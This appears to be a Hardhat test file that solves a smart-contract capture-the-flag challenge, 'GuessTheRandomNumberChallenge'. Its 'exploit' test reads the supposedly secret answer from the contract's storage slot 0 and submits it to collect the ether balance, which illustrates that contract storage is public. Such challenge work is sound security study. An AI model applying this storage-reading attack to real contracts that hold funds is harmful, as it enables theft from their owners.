import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { formatBytes32String, hexlify } from 'ethers/lib/utils';
import { ethers, network } from 'hardhat';
const { utils, provider } = ethers;

describe('GuessTheRandomNumberChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('GuessTheRandomNumberChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const answer = parseInt(await provider.getStorageAt(target.address, 0));
    await target.guess(answer, { value: utils.parseEther('1') });

    expect(await target.isComplete()).to.equal(true);
  });
});
